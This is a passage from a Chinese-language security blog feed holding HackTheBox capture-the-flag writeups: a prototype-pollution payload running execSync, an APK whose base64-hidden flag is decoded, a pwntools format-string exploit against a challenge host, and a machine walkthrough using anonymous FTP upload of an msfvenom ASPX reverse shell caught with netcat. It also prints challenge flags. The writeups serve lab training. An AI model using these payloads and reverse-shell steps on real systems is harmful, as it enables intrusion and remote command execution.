class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;$(cat flag*)&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>得到：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Command failed: $(cat flag*)&lt;br&gt;/bin/sh: HTB&#123;wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!&#125;: not found&lt;br&gt; on line 1&lt;br&gt;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/gunship_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://harshitm98.github.io/posts/htb-challenge-gunship/" >https://harshitm98.github.io/posts/htb-challenge-gunship/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;這次要來做的是一題 Web 而且有附上 Source Code 還有 Dockerfile，網站畫面很漂亮，只有一個</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="web" scheme="https://kazma.tw/tags/web/"/>
    
    <category term="prototype-pollution" scheme="https://kazma.tw/tags/prototype-pollution/"/>
    
    <category term="ast-injection" scheme="https://kazma.tw/tags/ast-injection/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Don&#39;t Overreact Writeup</title>
    <link href="https://kazma.tw/2024/10/30/HackTheBox-Challenges-Don-t-Overreact-Writeup/"/>
    <id>https://kazma.tw/2024/10/30/HackTheBox-Challenges-Don-t-Overreact-Writeup/</id>
    <published>2024-10-30T13:34:48.008Z</published>
    <updated>2024-10-30T13:46:10.856Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>這題是 mobile 的挑戰，給了一個 .apk。<br>.apk（Android Package）是一種用於 Android 應用程式的安裝包格式，類似 Windows 上的 .exe 或是 MacOS 的 .app，包含應用程式的所有資源、原始碼和配置文件，讓我們可以在 Android 上面安裝執行。</p><p>.apk 檔案的結構基本上是壓縮檔（ZIP 格式），內部包含以下幾種重要元件：<br>1.AndroidManifest.xml：應用程式的主要配置檔，包含應用的名稱、圖示、版本資訊、所需的權限（如相機、網路）以及各種活動（Activity）、服務（Service）等。<br>2.classes.dex：包含編譯過的 Android 應用程式碼，使用的是 Dalvik 位元組碼格式，這是 Android 特有的 Java 位元組碼格式。<br>3.res&#x2F; 資料夾：包含應用的資源檔案，如 UI 佈局、圖示、圖片和字串等。<br>4.lib&#x2F; 資料夾：包含應用所需的本地函式庫檔案（如 C 或 C++ 編寫的庫），針對不同的 CPU 架構（如 ARM 或 x86）有不同的子資料夾。<br>5.META-INF&#x2F; 資料夾：包含簽章檔案，用來確保 .apk 未被篡改，保護應用的完整性和安全性。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>因為是壓縮檔我們可以先執行：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip app-release.apk -d app_release</span><br></pre></td></tr></table></figure></div><p>然後就嘗試 grep 一些關鍵字像是 htb, hackthebox 就看到下面的資訊：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ grep -ri hackthebox                                                                                              ─╯</span><br><span class="line">./assets/index.android.bundle:__d(<span class="keyword">function</span>(g,r,i,a,m,e,d)&#123;Object.defineProperty(e,<span class="string">&quot;__esModule&quot;</span>,&#123;value:!0&#125;),e.myConfig=void 0;var t=&#123;importantData:<span class="string">&quot;baNaNa&quot;</span>.toLowerCase(),apiUrl:<span class="string">&#x27;https://www.hackthebox.eu/&#x27;</span>,debug:<span class="string">&#x27;SFRCezIzbTQxbl9jNDFtXzRuZF9kMG43XzB2MzIyMzRjN30=&#x27;</span>&#125;;e.myConfig=t&#125;,400,[]);</span><br></pre></td></tr></table></figure></div><p>然後看到一串可疑的 base64：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ <span class="built_in">echo</span> <span class="string">&quot;SFRCezIzbTQxbl9jNDFtXzRuZF9kMG43XzB2MzIyMzRjN30=&quot;</span> | <span class="built_in">base64</span> -d                                              ─╯</span><br><span class="line">HTB&#123;23m41n_c41m_4nd_d0n7_0v32234c7&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/react_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;這題是 mobile 的挑戰，給了一個 .apk。&lt;br&gt;.apk（Android Package）是一種用於 An</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="android" scheme="https://kazma.tw/tags/android/"/>
    
    <category term="mobile" scheme="https://kazma.tw/tags/mobile/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges racecar Writeup</title>
    <link href="https://kazma.tw/2024/10/28/HackTheBox-Challenges-racecar-Writeup/"/>
    <id>https://kazma.tw/2024/10/28/HackTheBox-Challenges-racecar-Writeup/</id>
    <published>2024-10-28T13:32:58.318Z</published>
    <updated>2024-10-28T18:24:57.623Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>首先這題是保護全開，然後我們先跑個幾次測試之後就可以得到資訊是前面的 Name 跟 Nickname 不重要，然後我們選第一台車跑第二張圖，或是第二台車跑第一張圖就可以比較容易贏得遊戲。遊戲勝利後他會去打開 flag.txt 所以我們需要先隨便設定一個 flag.txt，但是他只會打開不會輸出出來，丟進去 ida 後就會看到這邊在最後得獎感言的部分有一個 printf 的 format string 洞如下：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( car_choice == <span class="number">1</span> &amp;&amp; (result = v9, v9 &lt; v11) || car_choice == <span class="number">2</span> &amp;&amp; (result = v9, v9 &gt; v11) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n\n[+] You won the race!! You get 100 coins!\n&quot;</span>, <span class="string">&quot;\x1B[1;32m&quot;</span>);</span><br><span class="line">  coins += <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Current coins: [%d]%s\n&quot;</span>, coins);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[!] Do you have anything to say to the press after your big victory?\n&gt; %s&quot;</span>, <span class="string">&quot;\x1B[0m&quot;</span>);</span><br><span class="line">  speech = <span class="built_in">malloc</span>(<span class="number">369</span>);</span><br><span class="line">  flag_file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !flag_file )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s[-] Could not open flag.txt. Please contact the creator.\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">105</span>, v5, <span class="string">&quot;\x1B[1;36m&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="number">44</span>, flag_file);</span><br><span class="line">  read(<span class="number">0</span>, speech, <span class="number">368</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1B[0m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(speech, v6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>所以我們可以透過 format string 印出 flag.txt 的內容，然後我們可以先透過 gdb 來看 flag 的位置然後寫出我們的 exploit 來幫我們解出 flag。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/racecar_gdb.png"                      alt="gdb"                ><br>我們本地的 flag 設定成：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;aaaabbbb&quot;</span> &gt; flag.txt</span><br></pre></td></tr></table></figure></div><p>所以他的 hex 值會是 0x6161616162626262，方便我們觀察，然後我在 gdb 輸入了 beef 可以觀察到他們的位置關係，當然我覺得直接印出來觀察也是一個不錯的方式。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;94.237.48.79&quot;</span>, <span class="number">54556</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&quot;@&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>, <span class="number">25</span>):</span><br><span class="line">    p += <span class="string">&quot;%&#123;&#125;$p&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">p += <span class="string">&quot;#&quot;</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;Name:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;Nickname:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, p)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;@&quot;</span>)</span><br><span class="line">s = r.recvuntil(<span class="string">b&quot;#&quot;</span>).strip(<span class="string">b&quot;#&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> ss <span class="keyword">in</span> s.split(<span class="string">b&quot;0x&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> ss == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ss) // <span class="number">2</span>):</span><br><span class="line">        tmp += <span class="built_in">chr</span>(<span class="built_in">int</span>(ss[i * <span class="number">2</span> : i * <span class="number">2</span> + <span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">    flag += tmp[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>執行結果：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Opening connection to 94.237.48.79 on port 54556: Done</span><br><span class="line">HTB&#123;why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!&#125;\x00e.7üCú÷</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/racecar_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Recon&quot;&gt;&lt;a href=&quot;#Recon&quot; class=&quot;headerlink&quot; title=&quot;Recon&quot;&gt;&lt;/a&gt;Recon&lt;/h2&gt;&lt;p&gt;首先這題是保護全開，然後我們先跑個幾次測試之後就可以得到資訊是前面的 Name 跟 Nickname 不重要，然後我</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="fmtstr" scheme="https://kazma.tw/tags/fmtstr/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Machines Devel Writeup</title>
    <link href="https://kazma.tw/2024/10/27/HackTheBox-Machines-Devel-Writeup/"/>
    <id>https://kazma.tw/2024/10/27/HackTheBox-Machines-Devel-Writeup/</id>
    <published>2024-10-27T11:27:24.862Z</published>
    <updated>2024-10-28T13:09:23.275Z</updated>
    
    <content type="html"><![CDATA[<p>先 <code>nmap</code> 一下：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap -sV --script vuln 10.129.153.100</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 06:29 CDT</span><br><span class="line">Stats: 0:03:46 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.64% <span class="keyword">done</span>; ETC: 06:33 (0:00:01 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.153.100</span><br><span class="line">Host is up (0.077s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     Microsoft ftpd</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 7.5</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:microsoft:internet_information_services:7.5: </span><br><span class="line">|     PACKETSTORM:18058010.0https://vulners.com/packetstorm/PACKETSTORM:180580*EXPLOIT*</span><br><span class="line">|     MSF:AUXILIARY-DOS-WINDOWS-FTP-IIS75_FTPD_IAC_BOF-10.0https://vulners.com/metasploit/MSF:AUXILIARY-DOS-WINDOWS-FTP-IIS75_FTPD_IAC_BOF-*EXPLOIT*</span><br><span class="line">|     CVE-2010-397210.0https://vulners.com/cve/CVE-2010-3972</span><br><span class="line">|     SSV:201229.3https://vulners.com/seebug/SSV:20122*EXPLOIT*</span><br><span class="line">|     CVE-2010-27309.3https://vulners.com/cve/CVE-2010-2730</span><br><span class="line">|     SSV:201214.3https://vulners.com/seebug/SSV:20121*EXPLOIT*</span><br><span class="line">|     PACKETSTORM:1805844.3https://vulners.com/packetstorm/PACKETSTORM:180584*EXPLOIT*</span><br><span class="line">|     MSF:AUXILIARY-DOS-WINDOWS-HTTP-MS10_065_II6_ASP_DOS-4.3https://vulners.com/metasploit/MSF:AUXILIARY-DOS-WINDOWS-HTTP-MS10_065_II6_ASP_DOS-*EXPLOIT*</span><br><span class="line">|     CVE-2010-18994.3https://vulners.com/cve/CVE-2010-1899</span><br><span class="line">|     EDB-ID:158030.0https://vulners.com/exploitdb/EDB-ID:15803*EXPLOIT*</span><br><span class="line">|_    EDB-ID:151670.0https://vulners.com/exploitdb/EDB-ID:15167*EXPLOIT*</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 263.50 seconds</span></span><br></pre></td></tr></table></figure></div><p>他有開 ftp，我們可以用 <code>anonymous</code> 登入看到下面的資訊：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ftp 10.129.153.100</span><br><span class="line">Connected to 10.129.153.100.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">Name (10.129.153.100:root): anonymous</span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line">Password: </span><br><span class="line">230 User logged <span class="keyword">in</span>.</span><br><span class="line">Remote system <span class="built_in">type</span> is Windows_NT.</span><br><span class="line">ftp&gt; <span class="built_in">dir</span></span><br><span class="line">229 Entering Extended Passive Mode (|||49157|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client</span><br><span class="line">03-17-17  04:37PM                  689 iisstart.htm</span><br><span class="line">03-17-17  04:37PM               184946 welcome.png</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure></div><p>透過瀏覽器可以看到下面的畫面：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/devel_ftp.png"                      alt="ftp"                ><br>這表示了 FTP 跟 HTTP 伺服器共享同一個根目錄，這問題很大，因為我們可以透過上傳惡意的文件，然後透過 http 來觸發，例如說 reverse shell。<br>這邊會用到 metasploit 框架中的一個工具，可以用來生 payloads。<br>透過下面的指令我們可以看到 <code>aspx</code> 是支援的格式，同時從剛剛 FTP 的資訊我們可以看到他的目錄名稱應該是 ASP.NET 生成的，包括 <code>iisstart.htm</code> 是一個標準的 IIS（Internet Information Services） 的起始頁面，可以得知上面在運行 Microsoft IIS Web 的伺服器。根據上面的資訊我們會用 aspx 來生成我們的 reverse shell。</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfvenom --list formats</span><br><span class="line"></span><br><span class="line">Framework Executable Formats [--format &lt;value&gt;]</span><br><span class="line">===============================================</span><br><span class="line"></span><br><span class="line">    Name</span><br><span class="line">    ----</span><br><span class="line">    asp</span><br><span class="line">    aspx</span><br><span class="line">    aspx-exe</span><br><span class="line">    axis2</span><br><span class="line">    dll</span><br><span class="line">    ducky-script-psh</span><br><span class="line">    elf</span><br><span class="line">    elf-so</span><br><span class="line">    exe</span><br><span class="line">    exe-only</span><br><span class="line">    exe-service</span><br><span class="line">    exe-small</span><br><span class="line">    hta-psh</span><br><span class="line">    jar</span><br><span class="line">    jsp</span><br><span class="line">    loop-vbs</span><br><span class="line">    macho</span><br><span class="line">    msi</span><br><span class="line">    msi-nouac</span><br><span class="line">    osx-app</span><br><span class="line">    psh</span><br><span class="line">    psh-cmd</span><br><span class="line">    psh-net</span><br><span class="line">    psh-reflection</span><br><span class="line">    python-reflection</span><br><span class="line">    vba</span><br><span class="line">    vba-exe</span><br><span class="line">    vba-psh</span><br><span class="line">    vbs</span><br><span class="line">    war</span><br></pre></td></tr></table></figure></div><p>我們用下面的指令選一個看起來最普通的：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfvenom --list payloads | grep windows | grep reverse </span><br></pre></td></tr></table></figure></div><p>生 reverse shell：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfvenom -p windows/x64/shell/reverse_tcp -f aspx lhost=tun0 lport=4444 rhost=10.129.151.61 -o rshell.aspx</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of aspx file: 3675 bytes</span><br><span class="line">Saved as: rshell.aspx</span><br></pre></td></tr></table></figure></div><p>生好了！接著我們把他丟上去 FTP </p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ftp 10.129.151.61</span><br><span class="line">Connected to 10.129.151.61.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">Name (10.129.151.61:root): anonymous</span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line">Password: </span><br><span class="line">230 User logged <span class="keyword">in</span>.</span><br><span class="line">Remote system <span class="built_in">type</span> is Windows_NT.</span><br><span class="line">ftp&gt; put rshell.aspx </span><br><span class="line"><span class="built_in">local</span>: rshell.aspx remote: rshell.aspx</span><br><span class="line">229 Entering Extended Passive Mode (|||49157|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">100% |*************************************************************************************************|  3722       59.15 MiB/s    --:-- ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">3722 bytes sent <span class="keyword">in</span> 00:00 (13.98 KiB/s)</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">229 Entering Extended Passive Mode (|||49158|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client</span><br><span class="line">03-17-17  04:37PM                  689 iisstart.htm</span><br><span class="line">10-28-24  01:39PM                 3722 rshell.aspx</span><br><span class="line">03-17-17  04:37PM               184946 welcome.png</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure></div><p>結果上面那個 payload 好像行不通，我換成下面這個就成功了：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.63 LPORT=4444 -o rshell.aspx</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 324 bytes</span><br><span class="line">Final size of aspx file: 2719 bytes</span><br><span class="line">Saved as: rshell.aspx</span><br></pre></td></tr></table></figure></div><p>然後瀏覽器訪問就觸發 reverse shell 了：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nc -nlvp 4444 </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.14.63] from (UNKNOWN) [10.129.151.61] 49168</span><br><span class="line">Microsoft Windows [Version 6.1.7600]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;</span><br></pre></td></tr></table></figure></div><p>結果進去之後連 user flag 的權限都還沒有，然後也發現這台伺服器是 x86 難怪剛剛的第一次的 payload 不會過：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 